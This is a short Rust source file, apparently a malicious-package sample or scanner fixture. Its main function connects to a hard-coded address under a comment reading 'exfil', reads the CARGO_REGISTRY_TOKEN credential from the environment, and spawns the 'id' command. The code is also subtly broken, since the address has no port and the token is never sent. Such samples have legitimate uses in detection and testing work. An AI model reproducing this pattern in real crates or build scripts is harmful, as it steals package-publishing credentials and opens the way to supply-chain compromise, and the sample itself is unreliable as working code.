use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.0.100") { /* exfil */ }
    let _v = env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();
    Command::new("id").spawn().ok();
}
